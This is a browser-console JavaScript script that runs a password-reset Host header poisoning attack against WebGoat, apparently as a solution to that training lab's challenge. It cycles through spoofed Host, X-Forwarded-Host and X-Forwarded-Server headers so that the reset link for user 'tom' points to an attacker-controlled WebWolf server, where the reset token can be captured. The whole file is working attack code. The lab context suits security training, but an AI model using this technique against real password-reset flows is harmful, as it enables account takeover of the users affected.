// ============================================================
// WebGoat Password Reset - Browser Console Attack
// ============================================================
// Use this in your browser console (F12) on the WebGoat page
// ============================================================

console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('%cPassword Reset Host Header Attack', 'color: cyan; font-weight: bold');
console.log('%c====================================', 'color: cyan; font-weight: bold');

// Try multiple header manipulation techniques
async function tryHostHeaderAttack() {
    const methods = [
        {
            name: 'Host header',
            headers: {
                'Host': '192.168.254.112:8002',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        },
        {
            name: 'X-Forwarded-Host',
            headers: {
                'X-Forwarded-Host': '192.168.254.112:8002',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        },
        {
            name: 'X-Forwarded-Server',
            headers: {
                'X-Forwarded-Server': '192.168.254.112:8002',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        },
        {
            name: 'Combined headers',
            headers: {
                'Host': '192.168.254.112:8002',
                'X-Forwarded-Host': '192.168.254.112:8002',
                'X-Forwarded-Server': '192.168.254.112:8002',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }
    ];

    const body = 'email=tom@webgoat-cloud.org';

    for (const method of methods) {
        console.log(`\n%c[Trying] ${method.name}...`, 'color: yellow; font-weight: bold');
        
        try {
            const response = await fetch('/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link', {
                method: 'POST',
                headers: method.headers,
                body: body,
                credentials: 'include'
            });

            const result = await response.json();
            
            console.log(`%cResponse: ${result.feedback}`, 'color: white');
            
            if (result.lessonCompleted === true) {
                console.log('%c[SUCCESS] Challenge completed!', 'color: green; font-weight: bold');
                return;
            }
            
            if (result.feedback.includes('success') || result.feedback.includes('sent')) {
                console.log('%c[POSSIBLE SUCCESS] Check WebWolf!', 'color: green; font-weight: bold');
            }
            
        } catch (error) {
            console.log(`%c[ERROR] ${error.message}`, 'color: red');
        }
    }

    console.log('\n%c====================================', 'color: cyan; font-weight: bold');
    console.log('%cCheck WebWolf for captured requests:', 'color: cyan; font-weight: bold');
    console.log('%chttp://192.168.254.112:8002/requests', 'color: white; font-weight: bold');
    console.log('%c====================================', 'color: cyan; font-weight: bold');
}

// Run the attack
tryHostHeaderAttack();
